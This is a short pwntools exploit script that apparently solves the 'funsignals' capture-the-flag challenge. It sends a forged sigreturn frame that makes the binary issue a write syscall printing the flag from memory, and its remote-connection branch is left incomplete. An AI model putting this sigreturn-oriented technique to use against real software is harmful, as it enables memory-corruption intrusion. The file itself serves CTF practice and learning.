from pwn import *
elf = ELF("funsignals_player_bin")
#libc = ELF("")
context.log_level = "debug"
context.arch = "amd64"
#ip,port = "",

if len(sys.argv) > 1 and sys.argv[1] == "-gdb":
    r = gdb.debug(elf.path)
elif len(sys.argv) > 1 and sys.argv[1] == "-r":
    r = remote(remote_ip, port)
else:
    r = process(elf.path)

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b) 
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()

frame = SigreturnFrame()
frame.rip = 0x1000000b #syscall addr
frame.rax = 0x1 #write
frame.rdi = 0x1 #stdout 
frame.rsi = 0x10000023 # flag addr
frame.rdx = 0x30 #bytes to write

s(bytes(frame))

r.interactive()